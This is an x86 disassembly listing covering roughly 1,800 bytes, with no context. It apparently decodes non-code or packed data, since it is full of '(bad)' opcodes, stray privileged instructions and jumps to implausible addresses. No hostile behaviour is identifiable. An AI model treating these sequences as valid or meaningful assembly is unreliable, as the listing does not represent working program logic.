  40f51b:	mov    ah,cl
  40f51d:	mov    DWORD PTR [eax],0x8bc1ffc3
  40f523:	mov    eax,ebx
  40f525:	mov    BYTE PTR [eax],al
  40f527:	sar    bh,0x89
  40f52a:	sub    BYTE PTR [eax-0x77ff766c],cl
  40f530:	mov    esp,DWORD PTR [ebp+0x7c]
  40f533:	add    BYTE PTR [eax],al
  40f535:	inc    ebp
  40f536:	mov    esi,DWORD PTR ds:0xc7049c8d
  40f53c:	or     ah,bl
  40f53e:	add    BYTE PTR [ebp+0x458bf800],0x85
  40f545:	xor    DWORD PTR [edi],ecx
  40f547:	pushf  
  40f548:	js     0x40f511
  40f54a:	add    al,dh
  40f54c:	mov    eax,DWORD PTR [ebp+0x4509f8f4]
  40f552:	inc    eax
  40f553:	xor    eax,0x8b209f89
  40f558:	call   FWORD PTR [ebx+ecx*4]
  40f55b:	cmp    al,0x1
  40f55e:	mov    DWORD PTR [eax],0x8b8545c3
  40f564:	call   FWORD PTR [edi+edi*8]
  40f567:	dec    ebp
  40f568:	inc    ebp
  40f569:	mov    eax,DWORD PTR [ebx-0xffe374]
  40f56f:	mov    eax,DWORD PTR [eax]
  40f571:	mov    eax,edi
  40f573:	nop
  40f574:	ret    
  40f575:	add    BYTE PTR [ebp-0x130077],al
  40f57b:	jne    0x40f502
  40f57d:	test   edi,edi
  40f57f:	jne    0x40f580
  40f581:	dec    DWORD PTR [ebx-0x38aa1fe8]
  40f587:	call   0xffccf24f
  40f58c:	sbb    al,0x45
  40f58e:	stos   BYTE PTR es:[edi],al
  40f58f:	mov    eax,DWORD PTR [eax]
  40f591:	mov    edx,DWORD PTR [eax+0x3]
  40f594:	inc    ebp
  40f595:	cmp    al,0x8b
  40f597:	push   cs
  40f598:	cwde   
  40f599:	inc    ebp
  40f59a:	add    BYTE PTR [ebp-0xe78b39],al
  40f5a0:	call   FWORD PTR [esp+eax*1]
  40f5a3:	test   eax,0x8bffff00
  40f5a8:	mov    DWORD PTR [esp+eiz*4],ebx
  40f5ab:	adc    BYTE PTR [ebp+0x1],0x8b
  40f5af:	add    al,ch
  40f5b1:	add    al,dh
  40f5b3:	mov    DWORD PTR [ebp-0x3d],0x7589458b
  40f5ba:	mov    ecx,DWORD PTR [ebx-0x76cfe314]
  40f5c0:	inc    ebp
  40f5c1:	add    DWORD PTR [ebx-0x7aceb000],ecx
  40f5c7:	cmp    bh,0x1
  40f5ca:	inc    DWORD PTR [eax]
  40f5cc:	inc    ebp
  40f5cd:	push   eax
  40f5ce:	xor    ebp,ecx
  40f5d0:	add    eax,DWORD PTR [edx]
  40f5d2:	mov    DWORD PTR [eax],eax
  40f5d4:	and    al,0x80
  40f5d6:	inc    DWORD PTR [ecx]
  40f5d8:	lea    eax,[eax]
  40f5da:	pushf  
  40f5db:	or     BYTE PTR [ebp-0xfe00bb],al
  40f5e1:	jmp    0x13ff86b
  40f5e6:	dec    DWORD PTR [esi]
  40f5e8:	mov    ecx,ecx
  40f5ea:	loopne 0x40f571
  40f5ec:	mov    DWORD PTR [edx],0x4d8b00c3
  40f5f2:	sbb    al,0x8b
  40f5f4:	out    dx,al
  40f5f5:	mov    eax,DWORD PTR [eax]
  40f5f7:	push   eax
  40f5f8:	push   eax
  40f5f9:	test   DWORD PTR [ebp-0x1],eax
  40f5fc:	mov    edi,edi
  40f5fe:	cwde   
  40f5ff:	inc    ebp
  40f600:	add    BYTE PTR [ebx],dh
  40f602:	mov    DWORD PTR [ebx],0x24ff8918
  40f608:	add    al,0xff
  40f60a:	add    BYTE PTR [ebx-0x5ae30f77],cl
  40f610:	(bad)  
  40f611:	(bad)  
  40f612:	(bad)  
  40f613:	(bad)  
  40f614:	push   DWORD PTR [ebx]
  40f616:	or     BYTE PTR [ebx],al
  40f618:	ror    BYTE PTR [ecx-0xbad7d0],0x83
  40f61f:	(bad)  
  40f620:	cld    
  40f621:	sbb    BYTE PTR [ebx+0x765050ff],al
  40f627:	inc    ebp
  40f628:	mov    esi,DWORD PTR [ebx]
  40f62a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f62b:	add    ecx,esi
  40f62d:	push   eax
  40f62e:	mov    BYTE PTR [ebp+0x4d],0x5
  40f632:	jmp    0x40f634
  40f634:	mov    eax,DWORD PTR [eax]
  40f636:	clc    
  40f637:	mov    ecx,DWORD PTR [esp+ebx*1]
  40f63a:	inc    DWORD PTR [eax+0x5501fc]
  40f640:	mov    BYTE PTR [ebp-0xe70075],al
  40f646:	cmp    eax,DWORD PTR [eax]
  40f648:	push   eax
  40f649:	add    cl,ch
  40f64b:	xor    BYTE PTR [esi+0x4d],cl
  40f64e:	add    edi,edi
  40f650:	mov    ecx,DWORD PTR [eax]
  40f652:	mov    al,ds:0x8b8b004d
  40f657:	mov    ebp,DWORD PTR [ebx]
  40f659:	hlt    
  40f65a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f65b:	add    dh,al
  40f65d:	add    DWORD PTR [ebp+0x45],edx
  40f660:	mov    ecx,DWORD PTR [ecx+0x18d68b28]
  40f666:	dec    ebp
  40f667:	inc    eax
  40f668:	mov    DWORD PTR [ecx-0xbadf1c],ecx
  40f66e:	add    BYTE PTR [ebx-0x38162400],cl
  40f674:	add    bl,al
  40f676:	add    BYTE PTR [ebp-0x2e003e],al
  40f67c:	mov    DWORD PTR [ebp-0x10],eax
  40f67f:	mov    DWORD PTR [ebp+0x28],esp
  40f682:	push   eax
  40f683:	dec    DWORD PTR [ecx+0x5518e88d]
  40f689:	dec    DWORD PTR [ecx+0x5545f050]
  40f68f:	xor    ecx,DWORD PTR [edi]
  40f691:	add    edx,DWORD PTR [edx]
  40f693:	push   eax
  40f694:	xchg   ebp,eax
  40f695:	inc    ebp
  40f696:	inc    DWORD PTR ds:0xe200ff
  40f69c:	jnp    0x809612a2
  40f6a2:	mov    eax,DWORD PTR [ecx]
  40f6a4:	pusha  
  40f6a5:	add    bh,bh
  40f6a7:	test   ecx,eax
  40f6a9:	dec    DWORD PTR [edi+edi*8]
  40f6ac:	ret    0x8d00
  40f6af:	add    bh,bh
  40f6b1:	mov    ch,0xd7
  40f6b3:	(bad)  
  40f6b4:	cli    
  40f6b5:	inc    DWORD PTR [ebp+0x2255f830]
  40f6bb:	test   DWORD PTR [ebp+0x74],ecx
  40f6be:	add    ecx,DWORD PTR [ebx+0x65a01889]
  40f6c4:	or     BYTE PTR [eax],al
  40f6c6:	cmp    DWORD PTR [eax+0x74],edi
  40f6c9:	add    BYTE PTR [ebx+0x114dfc23],cl
  40f6cf:	sub    eax,DWORD PTR [eax]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x77]
  40f6d4:	mov    eax,edi
  40f6d6:	add    DWORD PTR [ebx],eax
  40f6d8:	inc    ebp
  40f6d9:	dec    ebp
  40f6da:	mov    ecx,DWORD PTR [edx+0x45450118]
  40f6e0:	add    cl,BYTE PTR [ebx+0x875fc4d]
  40f6e6:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e9:	inc    eax
  40f6ea:	push   ebp
  40f6eb:	push   ecx
  40f6ec:	mov    esi,DWORD PTR [edx-0x14]
  40f6ef:	mov    edx,DWORD PTR [ecx+0xce003c]
  40f6f5:	adc    DWORD PTR [eax+eax*1],0xd68b0045
  40f6fc:	add    al,0x55
  40f6fe:	push   ebp
  40f6ff:	add    ecx,DWORD PTR [ecx-0x2d030777]
  40f705:	push   ecx
  40f706:	test   DWORD PTR [ebx],eax
  40f708:	dec    DWORD PTR [ecx+0x554518ff]
  40f70e:	mov    edi,eax
  40f710:	sbb    al,0xec
  40f712:	inc    DWORD PTR [eax]
  40f714:	mov    DWORD PTR [eax],0xff8318
  40f71a:	add    al,0x83
  40f71c:	add    al,bh
  40f71e:	mov    ebp,edx
  40f720:	push   eax
  40f721:	push   ebp
  40f722:	test   DWORD PTR [edi+edi*8-0x73],esi
  40f726:	dec    DWORD PTR [eax]
  40f728:	inc    ebp
  40f729:	push   ebp
  40f72a:	xor    ecx,DWORD PTR [ebx+0x5589f003]
  40f730:	and    al,0x8b
  40f732:	(bad)  
  40f733:	call   0x89ddaec5
  40f738:	test   DWORD PTR [eax-0x1],esp
  40f73b:	(bad)  
  40f73c:	inc    DWORD PTR [ecx+0xffff85]
  40f742:	dec    DWORD PTR [ecx-0x6a1f5f75]
  40f748:	(bad)  
  40f749:	inc    ebx
  40f74b:	dec    DWORD PTR [ebx-0x117ee316]
  40f751:	arpl   WORD PTR [eax],ax
  40f753:	int    0x50
  40f755:	xor    eax,DWORD PTR [ebp-0x7f]
  40f758:	mov    esi,DWORD PTR [eax]
  40f75a:	cwde   
  40f75b:	pushf  
  40f75c:	add    BYTE PTR [ebp-0x1],dh
  40f75f:	mov    edi,edi
  40f761:	mov    al,ds:0x4d45ce08
  40f766:	inc    DWORD PTR [ebx]
  40f768:	adc    al,0x83
  40f76a:	add    BYTE PTR [eax],0x1
  40f76d:	adc    BYTE PTR [eax],al
  40f76f:	push   ebp
  40f770:	inc    ebp
  40f771:	add    edi,edi
  40f773:	mov    edx,DWORD PTR [eax]
  40f775:	mov    ecx,DWORD PTR [ebp-0x60]
  40f778:	push   esi
  40f779:	adc    al,0x8
  40f77b:	mov    edx,DWORD PTR [ebp-0x8]
  40f77e:	mov    ecx,DWORD PTR [ebp-0x4]
  40f781:	add    DWORD PTR [ebp-0x18],0xffffff8d
  40f785:	inc    DWORD PTR [eax+esi*8]
  40f788:	inc    ebp
  40f789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f78a:	mov    edx,DWORD PTR [ebp+0x1c]
  40f78d:	add    DWORD PTR [ebp-0x14],eax
  40f790:	mov    edx,DWORD PTR [ebp-0x70]
  40f793:	cmp    eax,DWORD PTR [eax]
  40f795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f796:	mov    eax,DWORD PTR [eax]
  40f798:	sbb    al,0x73
  40f79a:	add    BYTE PTR [ebx],0x1
  40f79d:	hlt    
  40f79e:	add    BYTE PTR [eax+0x30],dl
  40f7a1:	mov    DWORD PTR [ecx],esi
  40f7a3:	hlt    
  40f7a4:	pop    ds
  40f7a5:	inc    ebp
  40f7a6:	xor    al,BYTE PTR [ebp+0x6c760f3a]
  40f7ac:	(bad)  
  40f7ad:	push   DWORD PTR [edi]
  40f7af:	mov    ecx,DWORD PTR [ebx+0x398503a4]
  40f7b5:	push   DWORD PTR [ebx-0x1]
  40f7b8:	mov    eax,DWORD PTR [ebp-0x740075]
  40f7be:	sub    eax,DWORD PTR [eax]
  40f7c0:	add    eax,DWORD PTR [eax]
  40f7c2:	mov    DWORD PTR [ecx+0x5f],eax
  40f7c5:	mov    DWORD PTR [ebx+0x20],ebx
  40f7c8:	ret    0xff
  40f7cb:	mov    ecx,DWORD PTR [ebx+0x1cc783dc]
  40f7d1:	ret    
  40f7d2:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f7d8:	add    BYTE PTR [ebp-0x7d],al
  40f7db:	mov    DWORD PTR [eax],eax
  40f7dd:	sub    BYTE PTR [edi+edi*8+0x18008d01],al
  40f7e4:	sar    bh,cl
  40f7e6:	test   BYTE PTR [eax+0x1],dl
  40f7e9:	inc    ebp
  40f7ea:	add    BYTE PTR [ebx],dh
  40f7ec:	test   BYTE PTR [ebx],0x84
  40f7ef:	push   eax
  40f7f0:	add    BYTE PTR [ebp+0x0],al
  40f7f3:	add    eax,0x86
  40f7f8:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f7fe:	add    BYTE PTR [ecx],al
  40f800:	add    BYTE PTR [eax],al
  40f802:	mov    esi,0x550030
  40f807:	mov    ecx,DWORD PTR [edi]
  40f809:	sbb    al,0xda
  40f80b:	jne    0x40f80d
  40f80d:	mov    edi,DWORD PTR [ecx]
  40f80f:	xor    BYTE PTR [eax+eax*1],0x84
  40f813:	add    eax,DWORD PTR [eax]
  40f815:	cld    
  40f816:	add    BYTE PTR [ebp-0x4f],dh
  40f819:	mov    eax,DWORD PTR [ecx]
  40f81b:	cld    
  40f81c:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f822:	retf   0xe45
  40f825:	add    eax,edx
  40f827:	sbb    al,0xb7
  40f829:	dec    ebp
  40f82a:	or     al,0x89
  40f82c:	dec    ebp
  40f82d:	sbb    al,0xf
  40f82f:	inc    ebp
  40f830:	dec    eax
  40f831:	mov    eax,DWORD PTR [ebx]
  40f833:	sbb    al,0xf
  40f835:	nop
  40f836:	scas   al,BYTE PTR es:[edi]
  40f837:	add    DWORD PTR [eax],eax
  40f839:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f83f:	mov    eax,gs
  40f841:	add    bh,bh
  40f843:	mov    edi,edi
  40f845:	cmp    DWORD PTR [edi+0x72],edx
  40f848:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f84e:	gs cmp al,0x0
  40f851:	je     0x40f829
  40f853:	push   eax
  40f854:	sar    BYTE PTR [eax],1
  40f856:	mov    bh,0x3e
  40f858:	push   cs
  40f859:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f85f:	add    DWORD PTR [ecx+0x12],ebp
  40f862:	dec    edx
  40f863:	(bad)  
  40f864:	mov    eax,edx
  40f866:	in     al,dx
  40f867:	adc    DWORD PTR [ecx],esi
  40f869:	pop    esi
  40f86a:	inc    ecx
  40f86b:	leave  
  40f86c:	or     DWORD PTR [eax],ebx
  40f86e:	gs push ebp
  40f870:	add    ah,ch
  40f872:	into   
  40f873:	in     al,dx
  40f874:	enter  0xb756,0xf0
  40f878:	push   cs
  40f879:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f883:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f889:	jnp    0x74417d91
  40f88f:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f895:	add    BYTE PTR [edi],cl
  40f897:	mov    edi,DWORD PTR [ecx-0x78]
  40f89a:	ltr    WORD PTR [ecx-0x7b]
  40f89e:	dec    DWORD PTR [edi]
  40f8a0:	clc    
  40f8a1:	out    0x45,eax
  40f8a3:	add    BYTE PTR [eax],cl
  40f8a5:	cmp    ebx,0xffffff8c
  40f8a8:	jge    0x40f8aa
  40f8aa:	jb     0x40f8bc
  40f8ac:	je     0x4ff92c
  40f8b2:	pop    edx
  40f8b3:	push   esi
  40f8b4:	mov    ecx,DWORD PTR [edi]
  40f8b6:	in     al,dx
  40f8b7:	rol    DWORD PTR [ebp+0x0],1
  40f8ba:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f8c1:	cmp    DWORD PTR [ecx],0xfffffff0
  40f8c4:	hlt    
  40f8c5:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f8cb:	(bad)  
  40f8cd:	push   eax
  40f8ce:	jns    0xb840dd4c
  40f8d4:	lock push cs
  40f8d6:	ror    edx,0x3
  40f8d9:	test   BYTE PTR [ecx+0x5500e800],cl
  40f8df:	dec    eax
  40f8e0:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f8e4:	(bad)  
  40f8e5:	mov    esi,0x7f33ff5f
  40f8ea:	inc    eax
  40f8eb:	test   DWORD PTR [edx],eax
  40f8ed:	je     0x40f8af
  40f8ef:	mov    ecx,ecx
  40f8f1:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f8f5:	and    eax,DWORD PTR [eax+0xf0103]
  40f8fb:	jp     0x40f8e9
  40f8fd:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f901:	add    edx,DWORD PTR [edi+0x74]
  40f904:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f90a:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f910:	je     0x40f895
  40f912:	cmp    eax,edi
  40f914:	js     0x40f939
  40f916:	add    eax,0xeb0fc003
  40f91b:	jns    0x40f8a8
  40f91d:	vmread DWORD PTR [ecx+0x45],ebx
  40f921:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f927:	adc    al,0x8b
  40f929:	jge    0x40f93f
  40f92b:	mov    edi,DWORD PTR [eax-0x4]
  40f92e:	add    edi,DWORD PTR [edi]
  40f930:	or     bh,bh
  40f932:	push   ebp
  40f933:	push   es
  40f934:	mov    DWORD PTR [ebp-0x4],ebx
  40f937:	add    edi,esi
  40f939:	pop    es
  40f93a:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f940:	mov    DWORD PTR [esp+esi*8],ecx
  40f943:	inc    ebp
  40f944:	pop    ebp
  40f945:	xor    DWORD PTR [esi-0x4],0x3b
  40f949:	add    edx,DWORD PTR [ecx+edi*1]
  40f94c:	push   es
  40f94d:	clc    
  40f94e:	mov    bh,0xdb
  40f950:	jp     0x40f909
  40f952:	add    cl,BYTE PTR [esi]
  40f954:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f95a:	test   edi,edi
  40f95c:	je     0x40f952
  40f95e:	mov    eax,ecx
  40f960:	or     BYTE PTR [ebx],al
  40f962:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f968:	jbe    0x40f9dc
  40f96a:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f970:	add    ecx,DWORD PTR [esi]
  40f972:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f978:	add    eax,DWORD PTR [ebx-0x287af783]
  40f97e:	je     0x40f9cd
  40f980:	mov    DWORD PTR [ecx],edi
  40f982:	mov    esi,eax
  40f984:	hlt    
  40f985:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f98c:	jb     0x40f94e
  40f98e:	jmp    0x40f97b
  40f990:	xor    esi,DWORD PTR [ebx]
  40f992:	pop    edi
  40f993:	pop    esi
  40f994:	pop    ebx
  40f995:	ret    
  40f996:	ret    0x8b
  40f999:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f99f:	xor    DWORD PTR ds:0x89339c0c,0x56
  40f9a6:	cld    
  40f9a7:	cmp    DWORD PTR [ebp+0xf],eax
  40f9aa:	xor    al,BYTE PTR [ebp-0x7474ff64]
  40f9b0:	cld    
  40f9b1:	or     al,0x4d
  40f9b3:	ret    
  40f9b4:	mov    edi,DWORD PTR [esi-0x4]
  40f9b7:	pop    eax
  40f9b8:	dec    ebp
  40f9b9:	jne    0x40f946
  40f9bb:	xor    edi,esp
  40f9bd:	inc    eax
  40f9be:	dec    ebp
  40f9bf:	jbe    0x40fa14
  40f9c1:	inc    eax
  40f9c2:	pop    ebp
  40f9c3:	add    edx,DWORD PTR [esi+0x8]
  40f9c6:	push   esi
  40f9c7:	dec    eax
  40f9c8:	push   ecx
  40f9c9:	mov    eax,edi
  40f9cb:	and    al,0xf0
  40f9cd:	jo     0x40f9ba
  40f9cf:	mov    eax,DWORD PTR [ebx]
  40f9d1:	sbb    BYTE PTR [ebp+0x4d],cl
  40f9d4:	mov    eax,DWORD PTR [ebx]
  40f9d6:	nop
  40f9d7:	or     BYTE PTR [eax],al
  40f9d9:	jne    0x40fa32
  40f9db:	cmp    ebx,DWORD PTR [ebp+0x33893277]
  40f9e1:	cld    
  40f9e2:	xor    edi,edi
  40f9e4:	add    edi,DWORD PTR [ebp+0x3]
  40f9e7:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f9ed:	js     0x40f973
  40f9ef:	jae    0x40f9f3
  40f9f1:	(bad)  
  40f9f3:	xor    al,0x5d
  40f9f5:	jmp    0x40f982
  40f9f7:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f9fe:	fdecstp 
  40fa00:	test   BYTE PTR [edi],ah
  40fa02:	add    bh,BYTE PTR [ebp+0x0]
  40fa05:	add    ebx,DWORD PTR [ebp-0x77]
  40fa08:	mov    edi,eax
  40fa0a:	cmp    al,0x0
  40fa0d:	adc    dh,BYTE PTR [ebx]
  40fa0f:	jge    0x40fa14
  40fa11:	mov    edi,DWORD PTR [ebx]
  40fa13:	jl     0x40fa24
  40fa15:	clc    
  40fa16:	dec    edi
  40fa17:	jge    0x40fa19
  40fa19:	mov    eax,DWORD PTR [ebx]
  40fa1b:	jb     0x40fa25
  40fa1d:	mov    ecx,DWORD PTR [ebp-0x8]
  40fa20:	mov    edi,edi
  40fa22:	xor    edx,DWORD PTR [eax]
  40fa24:	add    edi,DWORD PTR [ebx]
  40fa26:	mov    DWORD PTR [ebp-0x10],edi
  40fa29:	inc    edi
  40fa2a:	pop    ebp
  40fa2b:	jge    0x40fa68
  40fa2d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40fa31:	mov    edx,0xc05d87f0
  40fa36:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40fa3a:	fimul  WORD PTR [eax]
  40fa3c:	fist   WORD PTR [ebp+0x1c]
  40fa3f:	in     al,dx
  40fa40:	jne    0x40fa2e
  40fa42:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40fa48:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40fa4c:	fdivp  st(0),st
  40fa4e:	fild   WORD PTR [ebp+0x4510f85c]
  40fa54:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40fa5a:	inc    ebp
  40fa5b:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40fa61:	mov    ebp,DWORD PTR [ebx-0x4]
  40fa64:	adc    al,0x8b
  40fa66:	rcl    DWORD PTR [eax],0x48
  40fa69:	mov    esi,0x7080803
  40fa6e:	fiadd  WORD PTR [ebp+0x4d]
  40fa71:	(bad)  
  40fa72:	mov    edx,DWORD PTR [edx-0x4]
  40fa75:	mov    edx,DWORD PTR [ebp-0x4]
  40fa78:	xor    ebx,DWORD PTR [ebx+0x330103]
  40fa7e:	mov    DWORD PTR [edi+0x872dc],edi
  40fa84:	xlat   BYTE PTR ds:[ebx]
  40fa85:	into   
  40fa86:	ffreep st(6)
  40fa88:	retf   0x6c7
  40fa8b:	iret   
  40fa8c:	dec    ebp
  40fa8d:	inc    ebp
  40fa8e:	mov    DWORD PTR [ebx],edi
  40fa90:	fmul   QWORD PTR [edi]
  40fa92:	dec    ebp
  40fa93:	jnp    0x40fac8
  40fa95:	add    BYTE PTR [ebx],al
  40fa97:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa9a:	inc    ebp
  40fa9b:	dec    ebp
  40fa9c:	lea    esi,[ebx]
  40fa9e:	add    DWORD PTR [ebx],eax
  40faa0:	jb     0x40fadd
  40faa2:	add    BYTE PTR [edi],cl
  40faa4:	inc    ebp
  40faa5:	imul   eax,edi,0x858bd800
  40faab:	cld    
  40faac:	clc    
  40faad:	mov    DWORD PTR [ebp+0x0],eax
  40fab0:	inc    DWORD PTR [eax]
  40fab2:	or     al,0xde
  40fab4:	sbb    bh,0x1
  40fab7:	retf   
  40fab8:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40fabf:	dec    ebp
  40fac0:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40fac6:	enter  0x12de,0xdf
  40faca:	inc    ebp
  40facb:	pop    ebp
  40facc:	dec    DWORD PTR [ebx-0x257f0ff4]
  40fad2:	add    DWORD PTR [edx],edx
  40fad4:	add    BYTE PTR [ebp+0x50],dl
  40fad7:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40fadd:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40fae3:	or     ah,al
  40fae5:	pop    ss
  40fae6:	cdq    
  40fae7:	push   ebp
  40fae8:	clc    
  40fae9:	mov    eax,DWORD PTR [ebp-0x4]
  40faec:	xor    edx,edx
  40faee:	add    esi,DWORD PTR [ebx]
  40faf0:	cmp    eax,DWORD PTR [ebx]
  40faf2:	hlt    
  40faf3:	cmp    DWORD PTR [ebx],esp
  40faf5:	or     al,BYTE PTR [ebp+0xf]
  40faf8:	mov    eax,DWORD PTR [edx]
  40fafa:	loopne 0x40fafc
  40fafc:	(bad)  
  40fafd:	mov    ecx,esi
  40faff:	cld    
  40fb00:	pushf  
  40fb01:	pop    ebp
  40fb02:	popf   
  40fb03:	mov    esi,DWORD PTR [edx]
  40fb05:	lock mov eax,eax
  40fb08:	adc    BYTE PTR [ebx],al
  40fb0a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40fb11:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40fb17:	dec    ebp
  40fb18:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40fb1e:	(bad)  
  40fb1f:	iret   
  40fb20:	inc    ebp
  40fb21:	(bad)  
  40fb22:	jne    0x40fb71
  40fb24:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40fb2a:	(bad)  
  40fb2b:	cmp    ebx,eax
  40fb2d:	je     0x40fab5
  40fb2f:	add    edi,edi
  40fb31:	or     bh,bh
  40fb33:	dec    ebp
  40fb34:	inc    ebp
  40fb35:	mov    esi,DWORD PTR [ebx]
  40fb37:	cld    
  40fb38:	add    ecx,esi
  40fb3a:	cmp    ecx,DWORD PTR [eax-0xc]
  40fb3d:	mov    edx,DWORD PTR [edi]
  40fb3f:	or     BYTE PTR [ebp-0x7c],al
  40fb42:	mov    ebx,DWORD PTR [ebp-0x7639cd18]
  40fb48:	test   BYTE PTR [ebx*4-0x76c1cdbb],cl
  40fb4f:	pushf  
  40fb50:	call   0x51eae0
  40fb55:	jne    0x40fb1e
  40fb57:	mov    ebp,esp
  40fb59:	fcomp  DWORD PTR [ebx]
  40fb5b:	add    BYTE PTR [ecx],al
  40fb5d:	inc    DWORD PTR [ebp-0x75]
  40fb60:	(bad)  
  40fb61:	cld    
  40fb62:	add    al,0xce
  40fb64:	mov    ecx,edi
  40fb66:	cld    
  40fb67:	inc    ebp
  40fb68:	fidivr WORD PTR [ebx]
  40fb6a:	fbstp  TBYTE PTR [ebp-0x3e]
  40fb6d:	mov    eax,DWORD PTR [eax]
  40fb6f:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fb75:	fadd   st,st(7)
  40fb77:	add    BYTE PTR [ebp-0x1],al
  40fb7a:	mov    ecx,DWORD PTR [esp+edi*8]
  40fb7d:	inc    ebp
  40fb7e:	mov    bh,0xc7
  40fb81:	loopne 0x40fbc8
  40fb83:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fb89:	sbb    dh,BYTE PTR [ebx]
  40fb8b:	pushf  
  40fb8c:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fb92:	mov    eax,edi
  40fb94:	cwde   
  40fb95:	inc    ebp
  40fb96:	inc    ebp
  40fb97:	jne    0x40fb24
  40fb99:	mov    esp,esp
  40fb9b:	clc    
  40fb9c:	add    al,0x4d
  40fb9e:	mov    DWORD PTR [ebx],esi
  40fba0:	or     al,0x33
  40fba2:	inc    ebp
  40fba3:	lea    ecx,[ebx-0x398d13fd]
  40fba9:	add    bh,al
  40fbab:	inc    ebp
  40fbac:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fbb3:	add    ebp,esp
  40fbb5:	shufps xmm1,xmm3,0xc7
  40fbb9:	(bad)  
  40fbba:	jmp    0x748636e3
  40fbbf:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fbc5:	hlt    
  40fbc6:	mov    ecx,DWORD PTR [edi]
  40fbc8:	fadd   DWORD PTR [ebp+0x0]
  40fbcb:	xor    ecx,DWORD PTR [edi]
  40fbcd:	add    ecx,ecx
  40fbcf:	cmp    edi,edi
  40fbd1:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fbd5:	(bad)  
  40fbd6:	jmp    0x40fb63
  40fbd8:	mov    edi,esp
  40fbda:	or     al,0xc6
  40fbdc:	inc    ebp
  40fbdd:	(bad)  
  40fbde:	mov    eax,DWORD PTR [ebp+0x10]
  40fbe1:	jne    0x40fb6c
  40fbe3:	mov    eax,DWORD PTR [ecx]
  40fbe5:	clc    
  40fbe6:	add    BYTE PTR [ebp-0x40],cl
  40fbe9:	xor    edx,DWORD PTR [eax-0x73]
  40fbec:	jne    0x40fbef
  40fbee:	push   DWORD PTR [edx+0x8]
  40fbf1:	add    BYTE PTR [ebp+0x45],al
  40fbf4:	mov    ebp,ecx
  40fbf6:	cld    
  40fbf7:	add    BYTE PTR [ebp+0x0],cl
  40fbfa:	xor    eax,DWORD PTR [ebp+0x3]
  40fbfd:	lea    edi,[ebx]
  40fbff:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40fc05:	sub    eax,0x5d330e4d
  40fc0a:	lea    esi,[ebx]
  40fc0c:	add    DWORD PTR [ebx],eax
  40fc0e:	jb     0x40fbf9
  40fc10:	add    BYTE PTR [eax],al
  40fc12:	inc    ebp
  40fc13:	add    bl,ch
  40fc15:	inc    ebp
  40fc16:	mov    esi,DWORD PTR [ebx]
  40fc18:	or     al,0x3
  40fc1a:	(bad)  
  40fc1b:	mov    edi,eax
  40fc1d:	in     al,dx
  40fc1e:	scas   eax,DWORD PTR es:[edi]
  40fc1f:	inc    ebp
  40fc20:	mov    esi,DWORD PTR [ebx]
  40fc22:	in     al,0x3
  40fc24:	add    al,0x89
  40fc26:	mov    ecx,DWORD PTR [eax+edi*8]
  40fc29:	dec    ebp
  40fc2a:	(bad)  
  40fc2b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3163]
  40fc32:	mov    ecx,eax
  40fc34:	cld    
  40fc35:	push   es
  40fc36:	dec    ebp
  40fc37:	add    al,0x33
  40fc39:	mov    DWORD PTR [ebx],eax
  40fc3b:	in     al,dx
  40fc3c:	cmp    DWORD PTR [ebp-0x67],eax
  40fc3f:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fc45:	mov    edx,DWORD PTR [ebp-0x4]
  40fc48:	mov    ecx,DWORD PTR [ebp-0x18]
  40fc4b:	xor    ecx,DWORD PTR [ebp+0x3]
  40fc4e:	cmp    DWORD PTR [ebx],0x8b32749c
  40fc54:	xor    edi,esp
